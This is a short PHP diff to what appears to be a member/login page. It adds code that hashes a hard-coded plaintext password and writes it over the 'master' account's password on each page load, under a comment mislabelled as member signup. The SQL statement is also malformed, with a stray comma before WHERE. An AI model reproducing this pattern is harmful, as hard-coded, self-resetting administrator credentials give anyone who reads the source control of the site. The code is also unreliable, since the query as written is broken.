@@ -30,6 +30,16 @@
 		$INCLUDE_CONTENTS = INCLUDE_PATH($MEMBER_DIR, $LOGIN_PATH);
 	}
 
+	/* 패스워드 암호화 */
+	$member_password = "wedn060104!";
+	$member_password_hash = password_hash($member_password, PASSWORD_DEFAULT);
+
+	/* 회원가입 */
+	$query = " UPDATE $KH[MEMBER] SET
+			MEMBER_PASSWORD = '$member_password_hash',
+			WHERE MEMBER_ID = 'master' ";
+	query($query);
+
 	include $INCLUDE_HEAD;
 	include $_SERVER['DOCUMENT_ROOT']."/config.php";
 	include $INCLUDE_CONTENTS;
